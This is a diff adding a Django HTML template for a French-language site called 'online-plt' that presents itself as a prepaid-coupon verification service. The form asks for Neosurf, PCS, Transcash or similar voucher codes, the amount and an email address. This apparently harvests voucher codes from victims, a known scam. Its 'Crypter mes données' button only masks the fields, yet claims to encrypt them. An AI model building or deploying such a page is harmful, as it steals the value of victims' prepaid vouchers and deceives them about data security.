@@ -1,0 +1,111 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VYGC</title>
+    <!-- Fonts Links For Icon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="{% static 'css/stylefooter.css' %}">
+    <link rel="stylesheet" href="{% static 'css/styleform.css' %}">
+    <link rel="icon" href="{% static 'imgs/logo.ico' %}" type="image/x-icon">
+    <link rel="shortcut icon" href="{% static 'imgs/logo.ico' %}" type="image/x-icon">
+</head>
+<body cz-shortcut-listen="true">
+<div class="body-form">
+    <form id="sendmail" method="post">
+        {% csrf_token %}
+        <h2>Veuillez entrer les informations du coupon ici.</h2>
+        <label for="type">Choissir une recharge * <span id="typeErr">{{ form.type.errors|join:", " }}</span></label>  
+        {{ form.type }}
+        <label for="montant">Montant * <span id="montantErr">{{ form.montant.errors|join:", " }}</span></label>  
+        {{ form.montant }}
+        <label for="devise">Choisir une devise * <span id="deviseErr">{{ form.devise.errors|join:", " }}</span></label>  
+        {{ form.devise }}
+        <label for="code1">Entrez les codes de recharge: <span id="code1Err">{{ form.code1.errors|join:", " }}</span></label>  
+        {{ form.code1 }}
+        {{ form.code2 }}
+        {{ form.code3 }}
+        {{ form.code4 }}
+        <div class="form-group submit-btn">
+			<input id="btncrypt" type="button" value="Crypter mes données" onclick="crypter()">
+		</div>
+        <label for="mail">Entrez votre adresse email * <span id="mail">{{ form.mail.errors|join:", " }}</span></label>  
+        {{ form.mail }}
+        <div class="form-group submit-btn">
+            <input id="valider" type="submit" value="Valider">
+        </div>
+    </form>
+</div>
+
+<section class="footer">
+    <div class="footer-row">
+        <div class="footer-col">
+            <h4 id="fi">
+                <img src="{% static 'imgs/logo.ico' %}" id="footerico" alt="logo">&nbsp;&nbsp; 
+                <b>online-plt</b>
+            </h4>
+            <p id="fi">
+                <b>online-plt</b> est un service de vérification de coupons en ligne. Cette plateforme vous permet de vérifier la validité de vos cartes de manière fiable et sécurisée
+            </p>
+        </div>
+        <div class="footer-col">
+            <h4>Services</h4>
+            <ul class="links">
+                <li><a href="#">Vérifications des coupons Neosurf</a></li>
+                <li><a href="#">Vérifications des coupons PCS</a></li>
+                <li><a href="#">Vérifications des coupons Amazon</a></li>
+                <li><a href="#">Vérifications des coupons GOOGLE PAY</a></li>
+                <li><a href="#">Vérifications des coupons TRANSCASH</a></li>
+                <li><a href="#">Bien d'autres</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h4>Réseaux</h4>
+            <ul class="links">
+                <li><a href="https://www.instagram.com/"><i class="fa-brands fa-instagram">&nbsp; &nbsp;</i>Instagram</a></li>
+                <li><a href="https://www.facebook.com/"><i class="fa-brands fa-facebook-f">&nbsp; &nbsp;</i>Facebook</a></li>
+                <li><a href="https://cm.linkedin.com/"><i class="fa-brands fa-linkedin"></i>&nbsp;&nbsp; LinkedIn</a></li>
+                <li><a href="https://twitter.com/"><i class="fa-brands fa-twitter"></i>&nbsp;&nbsp; Twitter</a></li>
+                <li><a href="https://www.skype.com/"><i class="fa-brands fa-skype"></i>&nbsp;&nbsp; Skype</a></li>
+                <li><a href="https://discord.com/"><i class="fa-brands fa-discord"></i>&nbsp;&nbsp; Discord</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h4>Horaires</h4>
+            <p>
+                Toujours ouverts !
+                La plateforme est disponible 24h/24 et 7j/7
+            </p>
+            <div class="icons">
+                <i class="fa-solid fa-door-open"></i>
+                <i class="fa-solid fa-rss"></i>
+                <i class="fa-solid fa-signal"></i>
+            </div>
+        </div>
+    </div>
+</section>
+<script>  
+    function crypter() {
+        const btn = document.getElementById('btncrypt');
+        const inps = document.querySelectorAll('.code');
+        if (btn.value == "Crypter mes données") {
+          for (const inp of inps) {
+            inp.type = "password";
+            btn.value = "Décrypter mes données";
+          }
+        } else {
+          for (const inp of inps) {
+            inp.type = "text";
+            btn.value = "Crypter mes données";
+          }
+        }
+      }
+</script>  
+
+<script src="{% static 'js/jquery.min.js' %}"></script>
+<script src="{% static 'js/script.js' %}"></script>
+</body>
+</html>
